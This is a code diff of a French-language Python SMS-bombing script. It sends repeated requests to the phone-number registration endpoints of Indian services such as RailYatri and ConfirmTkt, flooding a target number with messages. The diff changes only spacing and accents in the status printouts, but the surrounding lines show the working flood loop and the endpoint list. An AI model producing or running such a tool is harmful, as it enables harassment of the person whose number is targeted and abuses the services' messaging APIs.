@@ -18,9 +18,9 @@ def Envoi(cible, compteur, delai):
     "RailYatri": "https://www.railyatri.in/m/user-web-point?phone_number=",
     "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
     }
-    echec= 0
+    echec = 0
     requete = 0
-    succes= int(requete) - int(echec)
+    succes = int(requete) - int(echec)
     mael = int(compteur) + 1
     while succes != (int(mael)):
         api = random.choice(list(Faxel_bombe))
@@ -28,11 +28,11 @@ def Envoi(cible, compteur, delai):
         print("                BOMBAGE en cours, veuillez patienter !!           ")
         print("Veuillez garder votre connexion de données active pendant le bombardement.")
         print("==================================================================")
-        print("             Numéro cible                     : ", cible)
-        print("             Nombre de demandes envoyées      : ", requete)
-        print("             Requêtes réussies                : ", succes)
-        print("             Requêtes ayant échoué            : ", echec)
-        print("             API utilisée pour bombé la cible : ", api)
+        print("             Numero cible                     : ", cible)
+        print("             Nombre de demandes envoyees      : ", requete)
+        print("             Requêtes reussies                : ", succes)
+        print("             Requêtes ayant echouer           : ", echec)
+        print("             API utilise pour bomber la cible : ", api)
         print("==================================================================")
         reponse_url = str(Faxel_bombe[api])+cible
         try:
